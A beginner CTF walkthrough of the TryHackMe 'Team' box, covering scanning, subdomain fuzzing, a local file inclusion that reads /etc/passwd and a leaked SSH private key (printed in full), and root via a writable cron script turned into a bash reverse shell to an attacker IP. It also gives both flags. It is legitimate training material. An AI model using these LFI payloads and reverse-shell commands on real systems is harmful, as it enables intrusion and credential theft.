# Team Write-Up:

This is a beginner-friendly box on TryHackMe made by **dalemazza** and **P41ntP4rr0t**. Let's try it out!

## Port Scan:

I started out with an NMap scan:

```
sudo nmap -vv -sS -sC -sV -oN nmap-out {MACHINE_IP}
```

It returned the following ports:

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```
I have the complete NMap scan results saved on this repository.

## Directory Enumeration:

I then ran a Gobuster scan to enumerate the website:

```
gobuster -e -t 50 -u {MACHINE_IP} -w /usr/share/wordlists/directory-list-2.3-medium.txt -o gobuster-out -x '.html,.php,.txt,.js' -s 200,204,301,302,307
```

After running for a while, I did not get anything. I decided to check the {MACHINE_IP} page in my browser:

![apachepage](./screenshots/apachepage.png)

I noticed at the very top of the window, there is a non-standard message:

```
If you see this add "team.thm" to your hosts!
```

So I opened **/etc/hosts** in **nano** and added the highlighted line below:

![edithosts](./screenshots/edithosts.png)

I saved the file, and then I navigated to **http://team.thm/**:

![homepage](./screenshots/homepage.png)

Now we have our website! I then tried a new Gobuster scan with the new **team.thm** address (I also ran a scan on any subdirectories I found):

```
gobuster -e -t 50 -u team.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt -o gobuster-out -x '.html,.php,.txt,.js' -s 200,204,301,302,307
```

I got the following:

```
http://team.thm/index.html (Status: 200)
http://team.thm/images (Status: 301)
http://team.thm/scripts (Status: 301)
http://team.thm/assets (Status: 301)
http://team.thm/robots.txt (Status: 200)
http://team.thm/scripts/script.txt (Status: 200)
http://team.thm/assets/css (Status: 301)
http://team.thm/assets/js (Status: 301)
http://team.thm/assets/fonts (Status: 301)

```

The **robots.txt** file contained the following:

```
dale
```

Maybe this is a FTP or SSH username?

Here are the contents of the **script.txt** file:

```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

I couldn't find the other script file that this file refers to. I tried doing some more enumeration.

I used Wfuzz to attempt to brute-force any subdirectories:

```
wfuzz -c --hw 977 -u http://team.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt -H "Host: FUZZ.team.thm"```
```

I found the following subdirectory:

![devsubdir](./screenshots/devsubdir.png)

I navigated to **dev.team.thm**:

![devpage](./screenshots/devpage.png)

Followed the link:

![teamshare](./screenshots/teamshare.png)

I noticed the **?page=teamshare.php** at the end of the URL. This is a good sign that there is a **Local File Inclusion** (LFI) vulnerability. This means that we can read arbitrary files in the file system.

I tried entering the following URL:

```
http://dev.team.thm/script.php?page=/etc/passwd
```

And I got the following:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles:/bin/bash ftpuser:x:1002:1002::/home/ftpuser:/bin/sh ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
```

It works! Now I tried to see if I could read the user flag:

```
http://dev.team.thm/script.php?page=/home/dale/user.txt
```

I got the following:

```
THM{6Y0TXHz7c2d} 
```

That is our user flag!

I then fuzzed the URL with ZAP. I found this interesting URL:

```
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

It contained in it the RSA private key for the user Dale:

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----

```

I saved it to a file called **dale_rsa**. I took out all of the "#"s in it and did a **chmod 600** on it.

I then logged into Dale's SSH with the RSA_key:

```
ssh -i dale_rsa dale@{MACHINE_IP}
```

And now I'm in! Let's try to excalate privileges.

Looking into the **/opt/admin_stuff** directory, there is a file: **script.sh**:

```shell
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

It runs as root every minute, and it runs 2 scripts inside it. I checked to see if I had write permissions on either of the scripts. It turns out that I can write to the **main_backup.sh** file.

I opened **main_backup.sh** with nano and changed it to a reverse shell script:

```shell
#!/bin/bash
bash -i >& /dev/tcp/{THM_VPN_IP}/1234 0>&1
```

I then set up a Netcat listener on another terminal:

```
sudo nc -nvlp 1234
```

and after a minute, I got a root shell!

I then found the **root.txt** file in the **/root** directory:

```
THM{fhqbznavfonq}
```

That's our root flag! I hope you found this helpful!
